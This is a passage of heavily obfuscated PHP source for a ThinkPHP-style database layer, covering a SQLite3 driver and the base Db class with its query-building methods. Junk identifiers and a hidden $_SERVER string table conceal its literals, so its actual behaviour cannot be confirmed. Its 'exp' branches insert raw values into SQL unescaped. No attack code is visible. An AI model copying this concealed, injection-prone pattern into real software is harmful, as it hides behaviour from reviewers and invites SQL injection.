$‘¼Ÿıü[53]; } } return $£ñåãä„; } } class DbSqlite3Base extends Db { public function __construct($è£Í‚‹„ = '') { $Ù‡â–€Ê =& $_SERVER[…É¦À–]; if (!class_exists($Ù‡â–€Ê[54])) { think_exception(think_lang($Ù‡â–€Ê[14]) . $Ù‡â–€Ê[55]); } if (!empty($è£Í‚‹„)) { if (!isset($è£Í‚‹„[$Ù‡â–€Ê[16]])) { $è£Í‚‹„[$Ù‡â–€Ê[16]] = 438; } $this->config = $è£Í‚‹„; if (empty($this->config[$Ù‡â–€Ê[17]])) { $this->config[$Ù‡â–€Ê[17]] = array(); } } } public function connect($ëá“®Íş = '', $¢ äÒÎ = 0) { $’ì„’š² =& $_SERVER[…É¦À–]; if (!isset($this->linkID[$¢ äÒÎ])) { if (empty($ëá“®Íş)) { $ëá“®Íş = $this->config; } $this->linkID[$¢ äÒÎ] = new SQLite3($ëá“®Íş[$’ì„’š²[21]]); if (!$this->linkID[$¢ äÒÎ]) { think_exception($this->linkID[$¢ äÒÎ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¢ äÒÎ]->busyTimeout(30000); if (1 != think_config($’ì„’š²[22])) { unset($this->config); } } return $this->linkID[$¢ äÒÎ]; } public function free() { $this->queryID = null; } public function query($ã•«ä±ş) { $üÜ’Óì€ =& $_SERVER[…É¦À–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ã•«ä±ş; if ($this->queryID) { $this->free(); } think_action_status($üÜ’Óì€[23], 1); think_status($üÜ’Óì€[24]); $this->queryID = $this->_linkID->query($ã•«ä±ş); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¨‘ŞÕÌø = $this->getAll(); $this->numRows = count($¨‘ŞÕÌø); return $¨‘ŞÕÌø; } } public function execute($Íª Õ¬‰) { $’èÏéÓ… =& $_SERVER[…É¦À–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Íª Õ¬‰; if ($this->queryID) { $this->free(); } think_action_status($’èÏéÓ…[25], 1); think_status($’èÏéÓ…[24]); $¨¦î˜½ = $this->_linkID->exec($Íª Õ¬‰); $this->debug(); if (!1 === $¨¦î˜½) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[…É¦À–][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $„ØÆÓ’œ = $this->_linkID->query($_SERVER[…É¦À–][27]); if (!$„ØÆÓ’œ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ô¾È—ÇĞ = $this->_linkID->query($_SERVER[…É¦À–][28]); if (!$Ô¾È—ÇĞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ï›ßıÅş = array(); while ($ˆ¹–‰¦ú = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ï›ßıÅş[] = $ˆ¹–‰¦ú; } $this->queryID->reset(); return $ï›ßıÅş; } public function getFields($Åœù¶îÙ) { $†»¶î¥Ì =& $_SERVER[…É¦À–]; $Îš–ÇÏ = $this->query($†»¶î¥Ì[29] . $Åœù¶îÙ . $†»¶î¥Ì[30]); $£Ç¶Óì = array(); if ($Îš–ÇÏ) { foreach ($Îš–ÇÏ as $Š´¿ êú => $—Ú’¿») { $£Ç¶Óì[$—Ú’¿»[$†»¶î¥Ì[32]]] = array($†»¶î¥Ì[32] => $—Ú’¿»[$†»¶î¥Ì[32]], $†»¶î¥Ì[33] => $—Ú’¿»[$†»¶î¥Ì[33]], $†»¶î¥Ì[35] => (bool) ($—Ú’¿»[$†»¶î¥Ì[35]] === $†»¶î¥Ì[12]), $†»¶î¥Ì[37] => $—Ú’¿»[$†»¶î¥Ì[56]], $†»¶î¥Ì[39] => (bool) $—Ú’¿»[$†»¶î¥Ì[57]], $†»¶î¥Ì[42] => (bool) $—Ú’¿»[$†»¶î¥Ì[57]]); } } return $£Ç¶Óì; } public function getTables($®·ó§ìÒ = '') { $å—ıË½ş =& $_SERVER[…É¦À–]; $¥×òşÀ = $this->query($å—ıË½ş[45] . $å—ıË½ş[46] . $å—ıË½ş[47]); $È«§Àúå = array(); foreach ($¥×òşÀ as $Àâ¿·ş‚ => $Šà§¦Ø) { $È«§Àúå[$Àâ¿·ş‚] = current($Šà§¦Ø); } return $È«§Àúå; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $™Äèîş‰ =& $_SERVER[…É¦À–]; $this->error = $this->_linkID->lastErrorMsg(); if ($™Äèîş‰[12] != $this->queryStr) { $this->error .= LNG($™Äèîş‰[48]) . $this->queryStr; } think_trace($this->error, $™Äèîş‰[12], $™Äèîş‰[49]); return $this->error; } public function escapeString($Ø¬©ùª) { $ù¶”Ó‡ƒ =& $_SERVER[…É¦À–]; if ($this->_linkID) { return $this->_linkID->escapeString($Ø¬©ùª); } return str_ireplace($ù¶”Ó‡ƒ[58], $ù¶”Ó‡ƒ[59], $Ø¬©ùª); } public function parseLimit($µÊæ™† ) { $ßİô÷´€ =& $_SERVER[…É¦À–]; $»ëóá‰… = $ßİô÷´€[12]; if (!empty($µÊæ™† )) { $µÊæ™†  = explode($ßİô÷´€[50], $µÊæ™† ); if (count($µÊæ™† ) > 1) { $»ëóá‰… .= $ßİô÷´€[51] . $µÊæ™† [1] . $ßİô÷´€[52] . $µÊæ™† [0] . $ßİô÷´€[53]; } else { $»ëóá‰… .= $ßİô÷´€[51] . $µÊæ™† [0] . $ßİô÷´€[53]; } } return $»ëóá‰…; } } goto Aîçìç„ä‰; d±Ù²ÑöÊâ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\145\x71" => "\x3c\76", "\147\164" => "\x3e", "\x65\x67\x74" => "\76\75", "\x6c\164" => "\74", "\x65\x6c\x74" => "\74\x3d", "\x6e\157\x74\x6c\151\x6b\x65" => "\116\117\124\x20\x4c\111\113\x45", "\154\151\x6b\x65" => "\x4c\x49\113\x45", "\x69\x6e" => "\111\116", "\x6e\x6f\164\x69\156" => "\x4e\x4f\124\40\111\x4e", "\x6e\157\x74\x20\151\x6e" => "\116\x4f\124\40\111\x4e", "\142\x65\164\x77\145\145\x6e" => "\102\105\x54\x57\x45\x45\116", "\156\x6f\164\142\x65\164\x77\x65\x65\x6e" => "\116\x4f\x54\x20\102\105\124\127\x45\105\x4e", "\x6e\x6f\164\x20\x62\x65\x74\167\145\145\156" => "\116\x4f\124\40\x42\105\124\x57\105\x45\x4e"); protected $selectSql = "\123\x45\114\105\103\x54\45\104\111\123\124\111\116\103\x54\x25\x20\x25\106\111\x45\x4c\104\x25\x20\x46\122\x4f\x4d\40\45\124\101\x42\114\105\45\45\112\x4f\111\x4e\x25\x25\127\110\x45\x52\105\45\x25\x47\x52\117\125\x50\x25\45\110\x41\x56\111\116\107\45\x25\x4f\x52\x44\x45\x52\45\x25\x4c\111\x4d\111\124\45\40\x25\125\x4e\111\x4f\116\x25\x25\103\117\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $‡Îı›ù = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[…É¦À–][1005], $‡Îı›ù); } public function factory($ÜİŸ©Á = '') { $—¡ü­¡‹ =& $_SERVER[…É¦À–]; $ÜİŸ©Á = $this->parseConfig($ÜİŸ©Á); if (empty($ÜİŸ©Á[$—¡ü­¡‹[1006]])) { think_exception(think_lang($—¡ü­¡‹[1007])); } $this->dbType = ucwords(strtolower($ÜİŸ©Á[$—¡ü­¡‹[1006]])); $ĞÜâ’Ë = $—¡ü­¡‹[1008] . $this->dbType; if (class_exists($ĞÜâ’Ë)) { $ˆáÑ‹£ = new $ĞÜâ’Ë($ÜİŸ©Á); if ($—¡ü­¡‹[1009] != strtolower($ÜİŸ©Á[$—¡ü­¡‹[1006]])) { $ˆáÑ‹£->dbType = strtoupper($this->dbType); } else { $ˆáÑ‹£->dbType = $this->_getDsnType($ÜİŸ©Á[$—¡ü­¡‹[961]]); } } else { think_exception(think_lang($—¡ü­¡‹[1010]) . $—¡ü­¡‹[1011] . $ĞÜâ’Ë); } return $ˆáÑ‹£; } public function __call($—éÖñéÉ, $ş‰˜”Áƒ) { if (method_exists($this, $—éÖñéÉ)) { return call_user_func_array(array($this, $—éÖñéÉ), $ş‰˜”Áƒ); } } protected function _getDsnType($° ºÕ’) { $¨¥˜Š´ = explode($_SERVER[…É¦À–][4], $° ºÕ’); $åº ¢‰ = strtoupper(trim($¨¥˜Š´[0])); return $åº ¢‰; } private function parseConfig($Î©”ãàì = '') { $„ÜÊ¦œ£ =& $_SERVER[…É¦À–]; if (!empty($Î©”ãàì) && is_string($Î©”ãàì)) { $Î©”ãàì = $this->parseDSN($Î©”ãàì); } elseif (is_array($Î©”ãàì)) { $Î©”ãàì = array_change_key_case($Î©”ãàì); $Î©”ãàì = array($„ÜÊ¦œ£[1006] => $Î©”ãàì[$„ÜÊ¦œ£[1012]], $„ÜÊ¦œ£[933] => $Î©”ãàì[$„ÜÊ¦œ£[1013]], $„ÜÊ¦œ£[934] => $Î©”ãàì[$„ÜÊ¦œ£[1014]], $„ÜÊ¦œ£[931] => $Î©”ãàì[$„ÜÊ¦œ£[1015]], $„ÜÊ¦œ£[932] => $Î©”ãàì[$„ÜÊ¦œ£[1016]], $„ÜÊ¦œ£[21] => $Î©”ãàì[$„ÜÊ¦œ£[1017]], $„ÜÊ¦œ£[961] => $Î©”ãàì[$„ÜÊ¦œ£[1018]], $„ÜÊ¦œ£[17] => isset($Î©”ãàì[$„ÜÊ¦œ£[1019]]) ? $Î©”ãàì[$„ÜÊ¦œ£[1019]] : array()); } elseif (empty($Î©”ãàì)) { if (think_config($„ÜÊ¦œ£[1020]) && $„ÜÊ¦œ£[1009] != strtolower(think_config($„ÜÊ¦œ£[1021]))) { $Î©”ãàì = $this->parseDSN(think_config($„ÜÊ¦œ£[1020])); } else { $Î©”ãàì = array($„ÜÊ¦œ£[1006] => think_config($„ÜÊ¦œ£[1021]), $„ÜÊ¦œ£[933] => think_config($„ÜÊ¦œ£[1022]), $„ÜÊ¦œ£[934] => think_config($„ÜÊ¦œ£[1023]), $„ÜÊ¦œ£[931] => think_config($„ÜÊ¦œ£[1024]), $„ÜÊ¦œ£[932] => think_config($„ÜÊ¦œ£[1025]), $„ÜÊ¦œ£[21] => think_config($„ÜÊ¦œ£[275]), $„ÜÊ¦œ£[961] => think_config($„ÜÊ¦œ£[1020]), $„ÜÊ¦œ£[17] => think_config($„ÜÊ¦œ£[1026])); } } return $Î©”ãàì; } protected function initConnect($ÊÍ¬¬ÕŞ = true) { if (1 == think_config($_SERVER[…É¦À–][22])) { $this->_linkID = $this->multiConnect($ÊÍ¬¬ÕŞ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $’÷êÄ‰å => $é‡Â«°) { $this->_linkID = $é‡Â«°; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($çŒĞ¹²Å = false) { $ÙÕƒ—à’ =& $_SERVER[…É¦À–]; static $¼ÀàïëÁ = array(); static $öùºüÓ = -1; if (empty($¼ÀàïëÁ)) { foreach ($this->config as $ëÍÉÏ“ => $®ˆ£ˆü) { $¼ÀàïëÁ[$ëÍÉÏ“] = explode($ÙÕƒ—à’[50], $®ˆ£ˆü); } } if (think_config($ÙÕƒ—à’[1027])) { if ($çŒĞ¹²Å || think_config($ÙÕƒ—à’[424]) === !0) { $¬êïƒí¨ = floor(mt_rand(0, think_config($ÙÕƒ—à’[1028]) - 1)); $öùºüÓ = $¬êïƒí¨; } else { if (is_numeric(think_config($ÙÕƒ—à’[1029]))) { $¬êïƒí¨ = think_config($ÙÕƒ—à’[1029]); } else { $¬êïƒí¨ = floor(mt_rand(think_config($ÙÕƒ—à’[1028]), count($¼ÀàïëÁ[$ÙÕƒ—à’[931]]) - 1)); } } } else { $¬êïƒí¨ = floor(mt_rand(0, count($¼ÀàïëÁ[$ÙÕƒ—à’[931]]) - 1)); $öùºüÓ = $¬êïƒí¨; } $¬êïƒí¨ = $öùºüÓ !== -1 ? $öùºüÓ : $¬êïƒí¨; $”á“¦ÆÑ = array($ÙÕƒ—à’[933] => isset($¼ÀàïëÁ[$ÙÕƒ—à’[933]][$¬êïƒí¨]) ? $¼ÀàïëÁ[$ÙÕƒ—à’[933]][$¬êïƒí¨] : $¼ÀàïëÁ[$ÙÕƒ—à’[933]][0], $ÙÕƒ—à’[934] => isset($¼ÀàïëÁ[$ÙÕƒ—à’[934]][$¬êïƒí¨]) ? $¼ÀàïëÁ[$ÙÕƒ—à’[934]][$¬êïƒí¨] : $¼ÀàïëÁ[$ÙÕƒ—à’[934]][0], $ÙÕƒ—à’[931] => isset($¼ÀàïëÁ[$ÙÕƒ—à’[931]][$¬êïƒí¨]) ? $¼ÀàïëÁ[$ÙÕƒ—à’[931]][$¬êïƒí¨] : $¼ÀàïëÁ[$ÙÕƒ—à’[931]][0], $ÙÕƒ—à’[932] => isset($¼ÀàïëÁ[$ÙÕƒ—à’[932]][$¬êïƒí¨]) ? $¼ÀàïëÁ[$ÙÕƒ—à’[932]][$¬êïƒí¨] : $¼ÀàïëÁ[$ÙÕƒ—à’[932]][0], $ÙÕƒ—à’[21] => isset($¼ÀàïëÁ[$ÙÕƒ—à’[21]][$¬êïƒí¨]) ? $¼ÀàïëÁ[$ÙÕƒ—à’[21]][$¬êïƒí¨] : $¼ÀàïëÁ[$ÙÕƒ—à’[21]][0], $ÙÕƒ—à’[961] => isset($¼ÀàïëÁ[$ÙÕƒ—à’[961]][$¬êïƒí¨]) ? $¼ÀàïëÁ[$ÙÕƒ—à’[961]][$¬êïƒí¨] : $¼ÀàïëÁ[$ÙÕƒ—à’[961]][0], $ÙÕƒ—à’[17] => isset($¼ÀàïëÁ[$ÙÕƒ—à’[17]][$¬êïƒí¨]) ? $¼ÀàïëÁ[$ÙÕƒ—à’[17]][$¬êïƒí¨] : $¼ÀàïëÁ[$ÙÕƒ—à’[17]][0]); return $this->connect($”á“¦ÆÑ, $¬êïƒí¨); } public function parseDSN($–—»âè) { $ñã³³ =& $_SERVER[…É¦À–]; if (empty($–—»âè)) { return !1; } $¿Ò€‡±– = parse_url($–—»âè); if ($¿Ò€‡±–[$ñã³³[181]]) { $Àóİõ·é = array($ñã³³[1006] => $¿Ò€‡±–[$ñã³³[181]], $ñã³³[933] => isset($¿Ò€‡±–[$ñã³³[619]]) ? $¿Ò€‡±–[$ñã³³[619]] : $ñã³³[12], $ñã³³[934] => isset($¿Ò€‡±–[$ñã³³[1030]]) ? $¿Ò€‡±–[$ñã³³[1030]] : $ñã³³[12], $ñã³³[931] => isset($¿Ò€‡±–[$ñã³³[182]]) ? $¿Ò€‡±–[$ñã³³[182]] : $ñã³³[12], $ñã³³[932] => isset($¿Ò€‡±–[$ñã³³[183]]) ? $¿Ò€‡±–[$ñã³³[183]] : $ñã³³[12], $ñã³³[21] => isset($¿Ò€‡±–[$ñã³³[84]]) ? substr($¿Ò€‡±–[$ñã³³[84]], 1) : $ñã³³[12]); } else { preg_match($ñã³³[1031], trim($–—»âè), $İŞ¯’Çş); $Àóİõ·é = array($ñã³³[1006] => $İŞ¯’Çş[1], $ñã³³[933] => $İŞ¯’Çş[2], $ñã³³[934] => $İŞ¯’Çş[3], $ñã³³[931] => $İŞ¯’Çş[4], $ñã³³[932] => $İŞ¯’Çş[5], $ñã³³[21] => $İŞ¯’Çş[6]); } $Àóİõ·é[$ñã³³[961]] = $ñã³³[12]; return $Àóİõ·é; } protected function debug() { $œ×Ê¥˜¨ =& $_SERVER[…É¦À–]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $œ×Ê¥˜¨[1032]; if (think_config($œ×Ê¥˜¨[1033])) { think_status($œ×Ê¥˜¨[1034]); think_trace($this->queryStr . $œ×Ê¥˜¨[1035] . think_status($œ×Ê¥˜¨[24], $œ×Ê¥˜¨[1034], 6) . $œ×Ê¥˜¨[1036], $œ×Ê¥˜¨[12], $œ×Ê¥˜¨[1037]); } } protected function parseLock($åŸŞ«ÃÚ = false) { $‹áº²Ó =& $_SERVER[…É¦À–]; if (!$åŸŞ«ÃÚ) { return $‹áº²Ó[12]; } if ($‹áº²Ó[963] == $this->dbType) { return $‹áº²Ó[1038]; } return $‹áº²Ó[1039]; } protected function parseSet($Œ×ª×ß›) { $Ş³°ì¨ =& $_SERVER[…É¦À–]; foreach ($Œ×ª×ß› as $°¦ø²ş => $ŞÚòÕÏÂ) { if (is_array($ŞÚòÕÏÂ) && $Ş³°ì¨[326] == $ŞÚòÕÏÂ[0]) { $‰«Ñ™àÑ[] = $this->parseKey($°¦ø²ş) . $Ş³°ì¨[929] . $ŞÚòÕÏÂ[1]; } elseif (is_scalar($ŞÚòÕÏÂ) || is_null($ŞÚòÕÏÂ)) { $‰«Ñ™àÑ[] = $this->parseKey($°¦ø²ş) . $Ş³°ì¨[929] . $this->parseValue($ŞÚòÕÏÂ); } } return $Ş³°ì¨[1040] . implode($Ş³°ì¨[50], $‰«Ñ™àÑ); } protected function bindParam($ºŸ¢ŠÙ¹, $ÇíÌÉ¨³) { $this->bind[$_SERVER[…É¦À–][4] . $ºŸ¢ŠÙ¹] = $ÇíÌÉ¨³; } protected function parseBind($åÌ³Ü©) { $åÌ³Ü© = array_merge($this->bind, $åÌ³Ü©); $this->bind = array(); return $åÌ³Ü©; } function parseKey(&$ÉŸ£Äë, $ò®ñÖÌş = true) { if ($ò®ñÖÌş) { $ÉŸ£Äë = $this->parseKeyCheck($ÉŸ£Äë); } return $ÉŸ£Äë; } function parseKeyCheck($ïüÌÑîª) { $ğâä“ã =& $_SERVER[…É¦À–]; $ïüÌÑîª = trim($ïüÌÑîª); if (!preg_match($ğâä“ã[1041], $ïüÌÑîª)) { think_exception($ğâä“ã[1042] . $ïüÌÑîª); } return $ïüÌÑîª; } protected function parseValue($¯òÅ‚€) { $ˆô¼Êô¹ =& $_SERVER[…É¦À–]; if (is_string($¯òÅ‚€)) { $¯òÅ‚€ = $ˆô¼Êô¹[1002] . $this->escapeString($¯òÅ‚€) . $ˆô¼Êô¹[1002]; } elseif (isset($¯òÅ‚€[0]) && is_string($¯òÅ‚€[0]) && strtolower($¯òÅ‚€[0]) == $ˆô¼Êô¹[326]) { $¯òÅ‚€ = $this->escapeString($¯òÅ‚€[1]); } elseif (is_array($¯òÅ‚€)) { $¯òÅ‚€ = array_map(array($this, $ˆô¼Êô¹[1003]), $¯òÅ‚€); } elseif (is_bool($¯òÅ‚€)) { $¯òÅ‚€ = $¯òÅ‚€ ? $ˆô¼Êô¹[88] : $ˆô¼Êô¹[198]; } elseif (is_null($¯òÅ‚€)) { $¯òÅ‚€ = $ˆô¼Êô¹[103]; } return $¯òÅ‚€; } protected function parseField($Š¿ˆ˜Ü·) { $š¡Öä‹´ =& $_SERVER[…É¦À–]; if (is_string($Š¿ˆ˜Ü·) && strpos($Š¿ˆ˜Ü·, $š¡Öä‹´[50])) { $Š¿ˆ˜Ü· = explode($š¡Öä‹´[50], $Š¿ˆ˜Ü·); } if (is_array($Š¿ˆ˜Ü·)) { $èÛ±¼Õª = array(); foreach ($Š¿ˆ˜Ü· as $¦Á¤­Ñà => $…ÒÏ´–¸) { if (!is_numeric($¦Á¤­Ñà)) { $èÛ±¼Õª[] = $this->parseKey($¦Á¤­Ñà, !1) . $š¡Öä‹´[1043] . $this->parseKey($…ÒÏ´–¸); } else { $èÛ±¼Õª[] = $this->parseKey($…ÒÏ´–¸); } } $ÕõàÉÙ¯ = implode($š¡Öä‹´[50], $èÛ±¼Õª); } elseif (is_string($Š¿ˆ˜Ü·) && !empty($Š¿ˆ˜Ü·)) { $ÕõàÉÙ¯ = $Š¿ˆ˜Ü·; } else { $ÕõàÉÙ¯ = $š¡Öä‹´[189]; } return $ÕõàÉÙ¯; } protected function parseTable($ÅÈéè) { $³‘¡ü =& $_SERVER[…É¦À–]; if (is_array($ÅÈéè)) { $˜Ñ”‡ıè = array(); foreach ($ÅÈéè as $ñçÄİ¸ò => $¯öıæç) { if (!is_numeric($ñçÄİ¸ò)) { $˜Ñ”‡ıè[] = $this->parseKey($ñçÄİ¸ò) . $³‘¡ü[53] . $this->parseKey($¯öıæç); } else { $˜Ñ”‡ıè[] = $this->parseKey($ñçÄİ¸ò); } } $ÅÈéè = $˜Ñ”‡ıè; } elseif (is_string($ÅÈéè)) { if (strstr($ÅÈéè, $³‘¡ü[53])) { return $ÅÈéè; } $ÅÈéè = explode($³‘¡ü[50], $ÅÈéè); array_walk($ÅÈéè, array($this, $³‘¡ü[951])); } return $³‘¡ü[945] . trim(implode($³‘¡ü[1044], $ÅÈéè), $³‘¡ü[414]) . $³‘¡ü[945]; } protected function parseWhere($ë«ŸµÖ) { $÷êèÄü =& $_SERVER[…É¦À–]; $öÍÕ½áù = $÷êèÄü[12]; if (is_string($ë«ŸµÖ)) { $öÍÕ½áù = $ë«ŸµÖ; } else { $ó§¶†Ò  = isset($ë«ŸµÖ[$÷êèÄü[1045]]) ? strtoupper($ë«ŸµÖ[$÷êèÄü[1045]]) : $÷êèÄü[12]; if (in_array($ó§¶†Ò , array($÷êèÄü[1046], $÷êèÄü[1047], $÷êèÄü[1048]))) { $ó§¶†Ò  = $÷êèÄü[53] . $ó§¶†Ò  . $÷êèÄü[53]; unset($ë«ŸµÖ[$÷êèÄü[1045]]); } else { $ó§¶†Ò  = $÷êèÄü[1049]; } foreach ($ë«ŸµÖ as $Õ³«·ü× => $ü•¤ş) { $öÍÕ½áù .= $÷êèÄü[306]; if (is_numeric($Õ³«·ü×)) { $Õ³«·ü× = $÷êèÄü[1050]; } if (0 === strpos($Õ³«·ü×, $÷êèÄü[11])) { $öÍÕ½áù .= $this->parseThinkWhere($Õ³«·ü×, $ü•¤ş); } else { if (!preg_match($÷êèÄü[1051], trim($Õ³«·ü×))) { think_exception(think_lang($÷êèÄü[1052]) . $÷êèÄü[4] . $Õ³«·ü×); } $“ÍÙª–“ = is_array($ü•¤ş) && isset($ü•¤ş[$÷êèÄü[1053]]); $Õ³«·ü× = trim($Õ³«·ü×); if (strpos($Õ³«·ü×, $÷êèÄü[312])) { $Ü“ä—Æ = explode($÷êèÄü[312], $Õ³«·ü×); $¹øã–« = array(); foreach ($Ü“ä—Æ as $Â¾Î¾Àœ => $§Â´·„Ñ) { $œÁÛûƒ¾ = $“ÍÙª–“ ? $ü•¤ş[$Â¾Î¾Àœ] : $ü•¤ş; $¹øã–«[] = $÷êèÄü[289] . $this->parseWhereItem($this->parseKey($§Â´·„Ñ), $œÁÛûƒ¾) . $÷êèÄü[950]; } $öÍÕ½áù .= implode($÷êèÄü[1054], $¹øã–«); } elseif (strpos($Õ³«·ü×, $÷êèÄü[313])) { $Ü“ä—Æ = explode($÷êèÄü[313], $Õ³«·ü×); $¹øã–« = array(); foreach ($Ü“ä—Æ as $Â¾Î¾Àœ => $§Â´·„Ñ) { $œÁÛûƒ¾ = $“ÍÙª–“ ? $ü•¤ş[$Â¾Î¾Àœ] : $ü•¤ş; $¹øã–«[] = $÷êèÄü[289] . $this->parseWhereItem($this->parseKey($§Â´·„Ñ), $œÁÛûƒ¾) . $÷êèÄü[950]; } $öÍÕ½áù .= implode($÷êèÄü[1049], $¹øã–«); } else { $öÍÕ½áù .= $this->parseWhereItem($this->parseKey($Õ³«·ü×), $ü•¤ş); } } $öÍÕ½áù .= $÷êèÄü[307] . $ó§¶†Ò ; } $öÍÕ½áù = substr($öÍÕ½áù, 0, -strlen($ó§¶†Ò )); } return empty($öÍÕ½áù) ? $÷êèÄü[12] : $÷êèÄü[1055] . $öÍÕ½áù; } protected function parseWhereItem($ËÌˆÖØÕ, $Ñ²’Ø¥) { $©Ş½éà¨ =& $_SERVER[…É¦À–]; $ÃÍÇûé = $©Ş½éà¨[12]; if (is_array($Ñ²’Ø¥)) { if (is_string($Ñ²’Ø¥[0])) { $’Î ‰ = strtolower($Ñ²’Ø¥[0]); if (in_array($Ñ²’Ø¥[0], array($©Ş½éà¨[929], $©Ş½éà¨[1056], $©Ş½éà¨[1057], $©Ş½éà¨[1058], $©Ş½éà¨[1059], $©Ş½éà¨[1060]))) { $ÃÍÇûé .= $ËÌˆÖØÕ . $©Ş½éà¨[53] . $Ñ²’Ø¥[0] . $©Ş½éà¨[53] . $this->parseValue($Ñ²’Ø¥[1]); } elseif (preg_match($©Ş½éà¨[1061], $Ñ²’Ø¥[0])) { $ÃÍÇûé .= $ËÌˆÖØÕ . $©Ş½éà¨[53] . $this->exp[$’Î ‰] . $©Ş½éà¨[53] . $this->parseValue($Ñ²’Ø¥[1]); } elseif (preg_match($©Ş½éà¨[1062], $Ñ²’Ø¥[0])) { if (is_array($Ñ²’Ø¥[1])) { $’éèŸ£ç = isset($Ñ²’Ø¥[2]) ? strtoupper($Ñ²’Ø¥[2]) : $©Ş½éà¨[1047]; if (in_array($’éèŸ£ç, array($©Ş½éà¨[1046], $©Ş½éà¨[1047], $©Ş½éà¨[1048]))) { $â»µÁî¬ = array(); foreach ($Ñ²’Ø¥[1] as $«Ï«¯») { $â»µÁî¬[] = $ËÌˆÖØÕ . $©Ş½éà¨[53] . $this->exp[$’Î ‰] . $©Ş½éà¨[53] . $this->parseValue($«Ï«¯»); } $ÃÍÇûé .= $©Ş½éà¨[289] . implode($©Ş½éà¨[53] . $’éèŸ£ç . $©Ş½éà¨[53], $â»µÁî¬) . $©Ş½éà¨[950]; } } else { $ÃÍÇûé .= $ËÌˆÖØÕ . $©Ş½éà¨[53] . $this->exp[$’Î ‰] . $©Ş½éà¨[53] . $this->parseValue($Ñ²’Ø¥[1]); } } elseif ($©Ş½éà¨[326] == $’Î ‰) { $ÃÍÇûé .= $©Ş½éà¨[948] . $ËÌˆÖØÕ . $©Ş½éà¨[53] . $Ñ²’Ø¥[1] . $©Ş½éà¨[1063]; } elseif (preg_match($©Ş½éà¨[1064], $Ñ²’Ø¥[0])) { $ÃÍÇûé .= $Ñ²’Ø¥[0]; } elseif (preg_match($©Ş½éà¨[1065], $Ñ²’Ø¥[0])) { if (isset($Ñ²’Ø¥[2]) && $©Ş½éà¨[326] == $Ñ²’Ø¥[2]) { $ÃÍÇûé .= $ËÌˆÖØÕ . $©Ş½éà¨[53] . $this->exp[$’Î ‰] . $©Ş½éà¨[53] . $Ñ²’Ø¥[1]; } else { if (is_string($Ñ²’Ø¥[1])) { $Ñ²’Ø¥[1] = explode($©Ş½éà¨[50], $Ñ²’Ø¥[1]); } $¸±£³« = implode($©Ş½éà¨[50], $this->parseValue($Ñ²’Ø¥[1])); $ÃÍÇûé .= $ËÌˆÖØÕ . $©Ş½éà¨[53] . $this->exp[$’Î ‰] . $©Ş½éà¨[948] . $¸±£³« . $©Ş½éà¨[950]; } } elseif (preg_match($©Ş½éà¨[1066], $Ñ²’Ø¥[0])) { $Æ±…İÃÖ = is_string($Ñ²’Ø¥[1]) ? explode($©Ş½éà¨[50], $Ñ²’Ø¥[1]) : $Ñ²’Ø¥[1]; $ÃÍÇûé .= $©Ş½éà¨[948] . $ËÌˆÖØÕ . $©Ş½éà¨[53] . $this->exp[$’Î ‰] . $©Ş½éà¨[53] . $this->parseValue($Æ±…İÃÖ[0]) . $©Ş½éà¨[1049] . $this->parseValue($Æ±…İÃÖ[1]) . $©Ş½éà¨[307]; } else { think_exception(think_lang($©Ş½éà¨[1052]) . $©Ş½éà¨[4] . $Ñ²’Ø¥[0]); } } else { $¡€¥¨à» = count($Ñ²’Ø¥); $åÓ»½ö— = $©Ş½éà¨[12]; if (is_string($Ñ²’Ø¥[$¡€¥¨à» - 1])) { $åÓ»½ö— = isset($Ñ²’Ø¥[$¡€¥¨à» - 1]) ? strtoupper($Ñ²’Ø¥[$¡€¥¨à» - 1]) : $©Ş½éà¨[12]; if (in_array($åÓ»½ö—, array($©Ş½éà¨[1046], $©Ş½éà¨[1047], $©Ş½éà¨[1048]))) { $¡€¥¨à» = $¡€¥¨à» - 1; } } else { $åÓ»½ö— = $©Ş½éà¨[1046]; } for ($Óáá¤ã = 0; $Óáá¤ã < $¡€¥¨à»; $Óáá¤ã++) { $Æ±…İÃÖ = is_array($Ñ²’Ø¥[$Óáá¤ã]) ? $Ñ²’Ø¥[$Óáá¤ã][1] : $Ñ²’Ø¥[$Óáá¤ã]; if ($©Ş½éà¨[326] == strtolower($Ñ²’Ø¥[$Óáá¤ã][0])) { $ÃÍÇûé .= $©Ş½éà¨[289] . $ËÌˆÖØÕ . $©Ş½éà¨[53] . $Æ±…İÃÖ . $©Ş½éà¨[1063] . $åÓ»½ö— . $©Ş½éà¨[53]; } else { $†½¼ŠÖÚ = is_array($Ñ²’Ø¥[$Óáá¤ã]) ? $this->exp[strtolower($Ñ²’Ø¥[$Óáá¤ã][0])] : $©Ş½éà¨[929]; if (!$†½¼ŠÖÚ && is_array($Ñ²’Ø¥[$Óáá¤ã]) && in_array($Ñ²’Ø¥[$Óáá¤ã][0], array($©Ş½éà¨[929], $©Ş½éà¨[1056], 